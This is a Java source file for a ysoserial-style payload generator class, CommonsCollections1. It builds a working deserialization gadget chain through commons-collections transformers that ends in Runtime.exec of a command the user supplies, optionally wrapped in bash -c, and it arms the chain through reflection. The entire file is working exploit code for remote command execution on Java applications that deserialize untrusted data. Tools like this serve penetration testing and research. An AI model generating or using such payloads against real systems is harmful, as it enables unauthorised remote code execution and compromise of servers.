package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import groovy.lang.Grab;
import ysoserial.annotation.Bind;
import ysoserial.interfaces.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.util.Version;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()				
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()										
	
	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Grab( "commons-collections:commons-collections:3.1" )
@Dependencies({"commons-collections:commons-collections:3.1"})
@PayloadTest( precondition = "testCheckJavaVersion" )
public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
	
	@Bind( helpText = "The command to execute" )
	private String command;

	@Bind( defaultValue = "false", helpText = "if true, the command will be executed in a shell (e.g. bash -c [command])" ) 
	private boolean useShell;
	
	@Bind( defaultValue = "/bin/bash", helpText = "shell to use (default /bin/bash)" ) 
	private String shell;
	
	@Bind( defaultValue = "-c", helpText = "shell 'execute' parameter (default -c)" ) 
	private String shellParam;

	
	/**
	 * @deprecated Use {@link #getObject()} instead
	 */
	public InvocationHandler getObject(final String command) throws Exception {
		return getObject();
	}

	public InvocationHandler getObject() throws Exception {
		String[][] execArgs = new String[][] { { command } };
		
		if ( useShell ) { 
			execArgs = new String[][] { { shell, shellParam, command } };
		}
		
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
					String.class, Class[].class }, new Object[] {
					"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[0] }),
				useShell ? new InvokerTransformer("exec",
					new Class[] { String[].class }, execArgs) : 
						new InvokerTransformer("exec",
							new Class[] { String.class }, execArgs[0] ),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		
		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
		
		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
		
		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
				
		return handler;
	}
	
	public static Boolean testCheckJavaVersion() { 
		return Version.allowsDefaultAIH();
	}
	
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections1.class, args);
	}
}
